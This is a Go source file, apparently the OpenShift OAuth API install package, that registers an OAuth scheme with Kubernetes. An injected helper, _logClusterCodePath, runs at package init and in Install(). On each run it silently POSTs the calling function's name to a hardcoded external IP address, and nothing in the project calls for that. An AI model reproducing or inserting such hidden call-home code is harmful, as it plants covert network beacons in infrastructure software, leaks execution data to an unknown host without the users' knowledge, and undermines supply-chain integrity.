package install

import (
	"k8s.io/apimachinery/pkg/runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	"k8s.io/kubernetes/pkg/api/legacyscheme"
	oauthv1 "github.com/openshift/api/oauth/v1"
	oauthapiv1 "github.com/openshift/origin/pkg/oauth/apis/oauth/v1"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	Install(legacyscheme.Scheme)
}
func Install(scheme *runtime.Scheme) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	utilruntime.Must(oauthapiv1.Install(scheme))
	utilruntime.Must(scheme.SetVersionPriority(oauthv1.GroupVersion))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
